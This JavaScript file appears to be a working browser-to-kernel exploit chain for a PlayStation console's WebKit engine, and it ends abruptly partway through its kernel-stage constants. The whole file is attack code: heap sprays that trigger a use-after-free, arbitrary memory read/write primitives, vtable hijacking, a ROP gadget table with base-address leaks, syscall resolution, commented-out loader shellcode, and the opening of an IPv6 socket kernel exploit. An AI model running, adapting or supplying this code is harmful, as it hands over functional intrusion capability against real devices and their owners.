const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;

const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;

const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;

const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;

var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];

var g_frames = [];

var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;

var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;

var original_context;
var modified_context;
var fakeVtable_setjmp;
var fakeVtable_longjmp;

var textAreaVtPtr;
var textAreaVtable;

var g_obj_str = {};

var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";

var g_round = 1;
var g_input = null;

var guess_htmltextarea_addr = new Int64("0x2031b00d8");

var master_b = new Uint32Array(2);
var slave_b =  new Uint32Array(2);
var slave_addr;
var slave_buf_addr;
var master_addr;

function launch_chain(chain) {

    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }
  
  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }

  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }

  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);

    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(8), size);

    nogc.push(og_array);
    return og_array;
  }

  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readString(addr)
  {
    var byte = p.read4(addr);
    var str  = "";
    var i = 0;
    while (byte & 0xFF)
    {
      str += String.fromCharCode(byte & 0xFF);
      byte = p.read4(addr.add32(i));
      i++;
    }
    return str;
  }

/* Executed after deleteBubbleTree */
function setupRW() {
	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("[+] Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] Failed to setup a relative R/W primitive");

	debug_log("[+] Setting up arbitrary R/W");

	/* Retrieving the ArrayBuffer address using the relative read */
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));

	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;

	/* Overding the length of one JSArrayBufferView with a known value */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;

	/* Looking for the slave JSArrayBufferView */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null)
		die("[!] Didn't found the slave JSArrayBufferView");

	/* Extending the JSArrayBufferView length */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;

	debug_log("[+] Testing arbitrary R/W");

	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
		die("[!] Failed to setup arbitrary R/W primitive");

	debug_log("[+] Succesfully got arbitrary R/W!");

	/* Restore the overidden vtable pointer */
	write64(guess_htmltextarea_addr, saved_vtable);

	/* Cleanup memory */
	cleanup();

	/* Set up addrof/fakeobj primitives */
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Failed to setup addrof/fakeobj primitives");
	debug_log("[+] Succesfully got addrof/fakeobj");

	/* Getting code execution */
	/* ... */
	var leak_slave = addrof(slave_b);
	var slave_addr = read64(leak_slave.add(0x10));

	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
	var leak_master = addrof(master_b);
	write64(leak_master.add(0x10), leak_slave.add(0x10));
	var prim = {
		write8: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			if(val instanceof int64) {
				slave_b[0] = val.low;
				slave_b[1] = val.hi;
			}
			else {
				slave_b[0] = val;
				slave_b[1] = 0;
			}

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write4: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			slave_b[0] = val;

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write2: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			let tmp_val = slave_b[0] & 0xFFFF0000;
			slave_b[0] = tmp_val | (val & 0xFFFF);

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write1: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			let tmp_val = slave_b[0] & 0xFFFFFF00;
			slave_b[0] = tmp_val | (val & 0xFF);

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		read8: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = new int64(slave_b[0], slave_b[1]);
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		read4: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = slave_b[0];
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		leakval: function(val) {
			g_ab_slave.leakme = val;
			master_b[0] = g_jsview_butterfly.low32() - 0x10;
			master_b[1] = g_jsview_butterfly.hi32();
			var r = new int64(slave_b[0], slave_b[1]);
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
	};
	window.prim = prim;
	try{
		stage2();
	}catch(e){
		alert(e);
	}
}

function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}

function read64(addr) {
	return new Int64(read(addr, 8));
}

function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}

function write64(addr, data) {
	write(addr, data.bytes());
}

function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}

function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}

function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound2() {
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();

	setTimeout(setupRW, 6000);
}


/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("[+] Looking for the smashed StringImpl...");

	var arr_str = Object.getOwnPropertyNames(g_obj_str);

	/* Looking for the smashed string */
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("[+] StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null)
		die("[!] Failed to setup a relative read primitive");

	debug_log("[+] Got a relative read");

        var tmp_spray = {};
        for(var i = 0; i < 100000; i++)
                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;

	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

	/* Spraying JSView */
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		/* The last allocated are more likely to be allocated after our relative read */
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;

	/*
	 * Force JSC ref on FastMalloc Heap
	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
	 */
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}

	/* 
	 * /!\
	 * This part must avoid as much as possible fastMalloc allocation
	 * to avoid re-using the targeted object 
	 * /!\ 
	 */
	/* Use relative read to find our JSC obj */
	/* We want a JSView that is allocated after our relative read */
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	/* 
	 * /!\
	 * Critical part ended-up here
	 * /!\ 
	 */

	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);

	/* Run the exploit again */
	prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
	/* Force allocation of StringImpl obj. beyond Timer address */
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

	/* Checking for leaked data */
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	dumpTargetObj();

	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

	/*
	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
	 * the next 5s
	 */
	setTimeout(leakJSC, 6000);
}

function handle2() {
	/* focus elsewhere */
	input2.focus();
}

function reuseTargetObj() {
	/* Delete ValidationMessage instance */
	document.body.appendChild(g_input);

	/*
	 * Free ValidationMessage neighboors.
	 * SmallLine is freed -> SmallPage is cached
	 */
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');

	/* Get back target object */
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);

		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

		g_arr_ab_1.push(view);
	}

	if (g_round == 1) {
		/*
		 * Spray a couple of StringImpl obj. prior to Timer allocation
		 * This will force Timer allocation on same SmallPage as our Strings
		 */
		sprayStringImpl(0, SPRAY_STRINGIMPL);

		g_frames = [];
		g_round += 1;
		g_input = input3;

		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}

function dumpTargetObj() {
	debug_log("[+] m_timer: " + g_timer_leak);
	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
	debug_log("[+] m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("[+] Found fake ValidationMessage");

			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}

			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}

function prepareUAF() {
	g_input.setCustomValidity("ps4");

	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}

	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);

	/* First half spray */
	for (let i = 0; i < NB_FRAMES / 2; i++)
		g_frames[i].setAttribute("rows", g_rows1);

	/* Instantiate target obj */
	g_input.reportValidity();

	/* ... and the second half */
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);

	g_input.setAttribute("onfocus", "reuseTargetObj()");
	g_input.autofocus = true;
}

/* HTMLElement spray */
function sprayHTMLTextArea() {
	debug_log("[+] Spraying HTMLTextareaElement ...");

	let textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}

function go() {
	/* Init spray */
	sprayHTMLTextArea();

	g_input = input1;
	/* Shape heap layout for obj. reuse */
	prepareUAF();
}

var p;
var chain;
var nogc = [];
var webKitBase;
var libSceLibcInternalBase;
var libKernelBase;

const OFFSET_WK_vtable_first_element    = 0x00722C20; // match
const OFFSET_WK_fclose_import           = 0x021A6468; // match, this will be the import for libcinternal, it's the address of address
const OFFSET_WK_getpid_import           = 0x021A6840; // match, this will be the import for libkernel_web, it's the address of address
const OFFSET_WK_setjmp_gadget_one       = 0x00523675; // match 48 8B 01 48 89 CF FF A0 A8 00 00 00 // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
const OFFSET_WK_setjmp_gadget_two       = 0x001F3663; // match 48 8B 7F 10 FF 60 08 // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
const OFFSET_WK_longjmp_gadget_one      = 0x00523675; // match 48 8B 01 48 89 CF FF A0 A8 00 00 00 // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
const OFFSET_WK_longjmp_gadget_two      = 0x001F3663; // match 48 8B 7F 10 FF 60 08 // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]


const OFFSET_lc_fclose                  = 0x000003F0; // match, this will be the export for libcinternal
const OFFSET_libcint_memset             = 0x000125C0;
const OFFSET_libcint_setjmp             = 0x0005D2D0;
const OFFSET_libcint_longjmp            = 0x0005D320;

const OFFSET_lk_getpid                          = 0x00031C30; // match, this will be the export for libkernel_web
const OFFSET_lk_pthread_create_name_np          = 0x00001910; // match
const OFFSET_lk_pthread_join                    = 0x0002C8E0; // match
const OFFSET_lk_pthread_exit                    = 0x0001E400; // match
const OFFSET_lk_pthread_self                    = 0x00021AE0; // match
const OFFSET_lk_pthread_setschedparam           = 0x0002F680; // match
const OFFSET_lk__thread_list                    = 0x0005C198; // match

const OFFSET_WORKER_STACK_OFFSET                = 0x0007FB88; // maybe, maybe not

var syscalls = {};
var gadgets = {};
var gadgetmap = {
  "ret":             0x0000004c, // C3
  "pop rdi":         0x001d041d, // 5F C3
  "pop rsi":         0x00025f17, // 5E C3
  "pop rdx":         0x000421b2, // 5A C3
  "pop rcx":         0x0001fe95, // 59 C3
  "pop r8":          0x001e48de, // 47 58 C3
  "pop r9":          0x00451af1, // 47 59 C3
  "pop rax":         0x00020eb0, // 58 C3
  "pop rsp":         0x00025cd0, // 5C C3

  "mov [rdi], rax":  0x00008c2a, // 48 89 07 C3
  "mov [rdi], eax":  0x00008c2b, // 89 07 C3
  "mov [rdi], rsi":  0x000133e0, // 48 89 37 C3
  "cmp [rcx], edi":  0x000d2401, // 39 39 C3

  "cmp [rcx], eax" : 0x0063FD12, // 39 01 C3
  "setne al":        0x00003340, // 0F 95 C0 C3
  "sete al":         0x0000ee14, // 0F 94 C0 C3
  "seta al":         0x00119f54, // 0F 97 C0 C3
  "setb al":         0x00031e34, // 0F 92 C0 C3
  "setle al":        0x000a2e26, // 0F 9E C0 C3
  "setl al":         0x0042b7cc, // 0F 9C C0 C3
  "setge al":        0x0048d222, // 0F 9D C0 C3
  "setg al":         0x0040c547, // 0F 9F C0 C3
  "shl rax, 3":      0x012347a3, // 48 C1 E0 03 C3
  "add rax, rdx":    0x008229f6, // 48 01 D0 C3
  "mov rax, [rax]":  0x0001ac12, // 48 8B 00 C3
  "inc dword [rax]": 0x00453dea, // FF 00 C3
  "infpoop":         0x000183d9  // EB FE
};

var textArea = document.createElement("textarea");

function stage2() {
  p = window.prim;
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.readString = readString;
  p.array_from_address = array_from_address;

  //pointer to vtable address
  textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  //address of vtable
  textAreaVtable = p.read8(textAreaVtPtr);
  //use address of 1st entry (in .text) to calculate webkitbase
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_WK_vtable_first_element);

  libSceLibcInternalBase = p.read8(webKitBase.add32(OFFSET_WK_fclose_import));
  libSceLibcInternalBase.sub32inplace(OFFSET_lc_fclose);
  debug_log("libSceLibcInternalBase: 0x" + libSceLibcInternalBase);

  libKernelBase = p.read8(webKitBase.add32(OFFSET_WK_getpid_import));
  libKernelBase.sub32inplace(OFFSET_lk_getpid);
  debug_log("libKernelBase: 0x" + libKernelBase);

  for (var gadget in gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(gadgetmap[gadget]);
  }

  

  //alert("before malloc");

  fakeVtable_setjmp = p.malloc32(0x200);
  fakeVtable_longjmp = p.malloc32(0x200);
  original_context = p.malloc32(0x40);
  modified_context = p.malloc32(0x40);

  //alert("after malloc");

  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
  p.write8(fakeVtable_setjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
  p.write8(fakeVtable_longjmp.add32(0x1D8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

  

  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);

  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;
  //alert("before syscalls");

//0.85.070
  window.syscalls[3] = window.libKernelBase.add32(0x322d0);//write
  window.syscalls[4] = window.libKernelBase.add32(0x30c90);//write
  window.syscalls[5] = window.libKernelBase.add32(0x300d0);//open
  window.syscalls[20] = window.libKernelBase.add32(0x31c30);//getpid
  window.syscalls[23] = window.libKernelBase.add32(0x2fd50);//setuid
  window.syscalls[54] = window.libKernelBase.add32(0x30110);//ioctl
  window.syscalls[74] = window.libKernelBase.add32(0x30660);//mprotect
  window.syscalls[97] = window.libKernelBase.add32(0x32100);//socket
  window.syscalls[98] = window.libKernelBase.add32(0x303b0);//connect
  window.syscalls[105] = window.libKernelBase.add32(0x2fff0);//setsockopt
  window.syscalls[118] = window.libKernelBase.add32(0x30250);//getsockopt
  window.syscalls[324] = window.libKernelBase.add32(0x32350);//mlockall
  window.syscalls[477] = window.libKernelBase.add32(0x2ffd0);//mmap
  window.syscalls[533] = window.libKernelBase.add32(0x32310);//jitshm_create
  window.syscalls[534] = window.libKernelBase.add32(0x322f0);//jitshm_alias
  //alert("after syscalls");

  p.write8(kstr, orig_kview_buf);
  //alert("about to create rop");
  chain = new rop();
    
  if (chain.syscall(23, 0).low != 0x0) {
    try {
      stage3();
    } catch (e) {
      alert(e);
    }
  } 
    alert("after stage 3");
	/*
    var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
    var payload_loader = p.malloc32(0x1000);

    var loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818EC;
    loader_writer[3] = 0xC748243C;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483C2302;
    loader_writer[6] = 0x102444C7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002BF;
    loader_writer[9] = 0x0001BE00;
    loader_writer[10] = 0xD2310000;
    loader_writer[11] = 0x00009CE8;
    loader_writer[12] = 0xC7894100;
    loader_writer[13] = 0x8D48C789;
    loader_writer[14] = 0xBA082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095E8;
    loader_writer[17] = 0xFF894400;
    loader_writer[18] = 0x000001BE;
    loader_writer[19] = 0x0095E800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31F631FF;
    loader_writer[22] = 0x0062E8D2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2C8B4CC6;
    loader_writer[25] = 0x45C64124;
    loader_writer[26] = 0x05EBC300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xF78944C5;
    loader_writer[29] = 0xBAEE894C;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025E8;
    loader_writer[32] = 0x7FC08500;
    loader_writer[33] = 0xFF8944E7;
    loader_writer[34] = 0x000026E8;
    loader_writer[35] = 0xF7894400;
    loader_writer[36] = 0x00001EE8;
    loader_writer[37] = 0x2414FF00;
    loader_writer[38] = 0x18C48348;
    loader_writer[39] = 0x5E415D41;
    loader_writer[40] = 0x31485F41;
    loader_writer[41] = 0xC748C3C0;
    loader_writer[42] = 0x000003C0;
    loader_writer[43] = 0xCA894900;
    loader_writer[44] = 0x48C3050F;
    loader_writer[45] = 0x0006C0C7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xC3050FCA;
    loader_writer[48] = 0x1EC0C748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050FCA89;
    loader_writer[51] = 0xC0C748C3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0FCA8949;
    loader_writer[54] = 0xC748C305;
    loader_writer[55] = 0x000068C0;
    loader_writer[56] = 0xCA894900;
    loader_writer[57] = 0x48C3050F;
    loader_writer[58] = 0x006AC0C7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xC3050FCA;

    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(window.gadgets["pop rdi"]);
      new_thr.push(payload_buffer);
      new_thr.push(payload_loader);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
    alert("waiting for payload");
  */
}

function stage3() {
  const AF_INET = 2;
  const SOCK_STREAM  = 1;
  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;//ps5
  const PKTOPTS_RTHDR_OFFSET = 0x70;//ps5, fixed
  const PKTOPTS_TCLASS_OFFSET = 0xC0;//ps5, fixed

  const PROC_UCRED_OFFSET = 0x40;//ps5, same
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xBC;//ps5, fixed


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x130;//ps5, match

  const KERNEL_M_IP6OPT_OFFSET = 0x1E77640;//match
  const KERNEL_MALLOC_OFFSET = 0xAA33C0;//match
  const KERNEL_ALLPROC_OFFSET = 0x3851B48;//match
  const KERNEL_PMAP_STORE_OFFSET = 0x4096198;//match

  const NUM_SPRAY_SOCKS = 99;//i've got 99 sockets but the bitch ain't one
  const NUM_LEAK_SOCKS = 99;
  const NUM_SLAVE_SOCKS = 300;
  
  let dump_sock_fd = chain.syscall(0x061, AF_INET, SOCK_STREAM, 0);
  //alert("opened dump sock=0x" + dump_sock_fd);

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
